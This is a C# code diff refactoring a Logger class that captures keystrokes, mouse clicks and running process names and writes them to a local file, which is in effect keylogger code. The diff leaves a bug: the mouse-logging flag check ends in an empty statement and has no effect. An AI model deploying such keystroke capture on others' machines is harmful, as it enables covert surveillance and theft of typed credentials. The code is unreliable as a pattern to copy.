@@ -8,13 +8,14 @@ namespace EventLogger;
 public class Logger
 {
     private String _line;
-    private int _strokes; // used to determine when write string on file because the log string is too long
+    private int _eventsLogged; // used to determine when write string on file because the log string is too long
     private DateTime _previousClick = DateTime.Now; // used to determine double-left-click
     private String _processes = ""; // used to determine if a process is running
     private bool _deleting = false;
     private bool _fileTouch = false; // used to determine if the file has been written
+    private Constants _config;
     
-    public Logger()
+    public Logger(Constants config)
     {
         if (!File.Exists(Constants.PATH))
         {
@@ -24,28 +25,35 @@ public class Logger
             }	
         }
         _line = "";
-        _strokes = 0;
+        _eventsLogged = 0;
+        _config = config;
     }
 
     public void MouseLog(String key)
     {
-        if (Constants.LOG_PROCESS_ON_DOUBLE_CLICK && key=="[ML]")
+        
+        if (_config.LOG_PROCESS_ON_DOUBLE_CLICK && key=="[ML]")
         {
             if (DateTime.Now.Subtract(_previousClick).TotalMilliseconds <= 500)
             {
                 key = "[DML]";
-                ProcessLog(false);
+                if (_config.LOG_PROCESS_ON_DOUBLE_CLICK)
+                {
+                    ProcessLog(false);
+                }
             }
             _previousClick = DateTime.Now;
         }
+        if (!_config.LOG_MOUSE_EVENTS) ;
         _line += key;
     }
     
     public void KeyLog(String key)
     {
+        if (!_config.LOG_KEYBOARD_EVENTS) return;
         _line += key;
-        _strokes++;
-        if (_strokes < Constants.MAX_LOG_LENGTH) return;
+        _eventsLogged++;
+        if (_eventsLogged < _config.COUNT_EVENTS_BEFORE_LOG_ON_FILE) return;
         Log();
     }
 
@@ -62,7 +70,7 @@ public class Logger
         {
             // if the process has changed, log it
             _line += "<"+DateTime.Now+","+newProcesses+">";
-            _strokes++;
+            _eventsLogged++;
         }
         _processes = newProcesses;
     }
@@ -76,7 +84,7 @@ public class Logger
             w.WriteLine(_line);
         }
         _line = "";
-        _strokes = 0;
+        _eventsLogged = 0;
         _fileTouch = true;
     }
 
